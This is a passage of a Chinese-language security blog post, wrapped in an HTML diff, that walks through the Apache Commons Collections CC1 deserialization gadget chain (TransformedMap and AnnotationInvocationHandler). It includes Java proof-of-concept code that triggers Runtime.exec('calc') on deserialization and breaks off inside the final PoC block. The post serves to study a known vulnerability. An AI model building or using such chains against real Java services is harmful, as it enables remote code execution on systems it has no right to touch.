@@ -1,0 +1,369 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>CC1-TransformedMap | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="CC1-TransformedMapCC1链对JDK版本有要求，需在8u71之前
+Jdk1.8.0.65: https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html
+sun包: https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4src\share\classes\sun，放到Jdk下解压的src包内，Idea添加
+
+导入maven依赖（pom.xml）
+
+Transformer-执行类主要利用方法 Transform()，看那些类实现了这个类"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="CC1-TransformedMap"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> CC1-TransformedMap</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="CC1-TransformedMap"><a href="#CC1-TransformedMap" class="headerlink" title="CC1-TransformedMap"></a>CC1-TransformedMap</h2><p>CC1链对JDK版本有要求，需在8u71之前</p>
+<p>Jdk1.8.0.65: <a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
+<p>sun包: <a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a><br>src\share\classes\sun，放到Jdk下解压的src包内，Idea添加</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114132357257.png" alt="image-20231114132357257"></p>
+<p>导入maven依赖（pom.xml）</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231113194232916.png" alt="image-20231113194232916"></p>
+<h3 id="Transformer-执行类"><a href="#Transformer-执行类" class="headerlink" title="Transformer-执行类"></a>Transformer-执行类</h3><p>主要利用方法 <code>Transform()</code>，看那些类实现了这个类</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231113213642842.png" alt="image-20231113213642842"></p>
+<p>查找用法，找到调用 transformer 的方法</p>
+<h3 id="寻找调用链"><a href="#寻找调用链" class="headerlink" title="寻找调用链"></a>寻找调用链</h3><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231113234523714.png" alt="image-20231113234523714"></p>
+<p>InvokerTransformer构造函数控制参数，<code>tranform()</code> 可以执行任意命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer</span></span><br><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Runtime正常执行</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Runtime反射执行</span></span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method m = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        m.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// InvokerTransformer.transform()实现</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.getRuntime());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>进入到 InvokerTransformer类里，查看 Transform 的用法，找 TransformedMap</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114111733071.png" alt="image-20231114111733071"></p>
+<p>这里的 valueTransformer 调用了 <code>transformer()</code>，TransformedMap构造方法可以给他赋值</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231113222410600.png" alt="image-20231113222410600"></p>
+<p><code>TransformedMap()</code> 是一个保护方法，<code>decorate()</code> 方法调用了它，就可以赋值了</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114113445459.png" alt="image-20231114113445459"></p>
+<p>现在找哪里调用了 <code>checkSetValue()</code>，这里找到了 <code>setValue()</code></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114115339182.png" alt="image-20231114115339182"></p>
+<p>这个类还是 TransformedMap 的父类</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114115940344.png" alt="image-20231114115940344"></p>
+<p><code>setValue()</code> 在 AbstractInputCheckedMapDecorator 静态嵌套类 MapEntry</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114120226678.png" alt="image-20231114120226678"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;vlue&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对 Entry 进行遍历</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// TransformedMap没有setValue()，会调用父类的setValue()</span></span><br><span class="line">            entry.setValue(Runtime.getRuntime());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h3><p>AnnotationInvocationHandler类下的<code>readObject()</code></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114131907479.png" alt="image-20231114131907479"></p>
+<h4 id="readObject"><a href="#readObject" class="headerlink" title="readObject()"></a>readObject()</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114133137755.png" alt="image-20231114133137755"></p>
+<p>后面的 for 正好在遍历 Map，要满足 if 的判断到达 <code>setValue()</code>，</p>
+<p>执行 <code>readObject()</code> 需要获取 AnnotationInvocationHandler 对象，default类型</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114133608973.png" alt="image-20231114133608973"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure>
+
+<p>回到前面，Runtime 没有实现 Serializable，所以不能序列化</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114134429551.png" alt="image-20231114134429551"></p>
+<p>Class 可以序列化，反射获取</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114134701335.png" alt="image-20231114134701335"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不能序列化</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射调用</span></span><br><span class="line"><span class="type">Class</span>  <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成 InvokerTransformer 调用形式</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行测试</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>
+
+<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231113234038569.png" alt="image-20231113234038569"></p>
+<p>该类维护了一个Transformer接口类型的数组iTransformers，<code>transform()</code> 先将输入的对象交给iTransformers数组第一个转换器的 <code>transform()</code> 进行修饰，修饰后的结果又作为下一个转化器的要修饰的对象（链式转化器）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_Serial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ChainedTransformer链式执行</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>断点走一下 <code>readObject()</code> 的 if 判断</p>
+<p>前三行循环获取键值对获取</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114171157770.png" alt="image-20231114171157770"></p>
+<p>总览</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114172318807.png" alt="image-20231114172318807"></p>
+<p><code>annotationType = AnnotationType.getInstance(type);</code> 获取 type 成员方法，没有会新建一个AnnotationType</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114172915205.png" alt="image-20231114172915205"></p>
+<p>AnnotationInvocationHandler 构造方法内可以给 type 赋值</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114172416803.png" alt="image-20231114172416803"></p>
+<p>上面代码，赋值的是 Override，Java的注释类，而 Override 没有参数</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114173211138.png" alt="image-20231114173211138"></p>
+<p>换成 Target，然后 map 的 put，进入的键值对的 key 要改成 Target 参数的名，且值不为 null</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114173329370.png" alt="image-20231114173329370"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>继续调试，可以执行 <code>setValue()</code>，继续跟进，发现 <code>checkSetValue(value)</code> 中 value 的值不是构想的Runtime</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114174205086.png" alt="image-20231114174205086"></p>
+<p>第二个 if 判断是否对象可以强转，最后的 <code>setValue(value)</code> 的 value 是 new 的 AnnotationTypeMismatchExceptionProxy，固定了，改不了</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114173932154.png" alt="image-20231114173932154"></p>
+<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>这里的 transform 无论接受什么，返回值不会改变，都是 iConstant</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20231114181215574.png" alt="image-20231114181215574"></p>
+<h3 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain：</span></span><br><span class="line"><span class="comment">   	 objectInputStream.readobject()</span></span><br><span class="line"><span class="comment">        	AnnotationInvocationHandler.readobject()</span></span><br><span class="line"><span class="comment">            	TransformedMap.entrySet()</span></span><br><span class="line"><span class="comment">            		AbstractInputCheckedMapDecorator$MapEntry.setValue()</span></span><br><span class="line"><span class="comment">               	 	(TransformedMap继承AbstractInputCheckedMapDecorator)</span></span><br><span class="line"><span class="comment">                    	TransformedMap.checkSetvalue()</span></span><br><span class="line"><span class="comment">                       	 ChainedTransformner.transform()</span></span><br><span class="line"><span class="comment">                          	  ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                           	 InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                             	   Method.invoke()</span></span><br><span class="line"><span class="comment">                            	        Class.getMethod()</span></span><br><span class="line"><span class="comment">                          	  InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           	     Method.invoke()</span></span><br><span class="line"><span class="comment">                         	           Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                          	  InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            	    Method.invoke()</span></span><br><span class="line"><span class="comment">                            	        Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span 